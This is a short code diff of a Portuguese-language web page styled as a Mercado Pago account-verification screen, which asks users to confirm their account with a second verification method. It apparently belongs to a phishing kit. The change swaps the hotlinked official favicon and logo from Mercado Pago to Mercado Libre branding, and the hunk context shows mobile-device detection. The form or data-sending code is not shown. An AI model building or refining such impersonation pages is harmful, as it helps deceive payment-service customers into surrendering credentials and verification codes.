@@ -41,7 +41,7 @@ if (isMobileDevice()) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Use um segundo método de verificação para confirmar que a conta pertence a você</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ui-navigation/6.6.5/mercadolibre/favicon.ico" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -142,7 +142,7 @@ if (isMobileDevice()) {
 <body>
 
     <header class="main-header">
-        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
+        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.5/mercadolibre/pt_logo_large_plus.webp" alt="Mercado Pago">
     </header>
 
     <main>
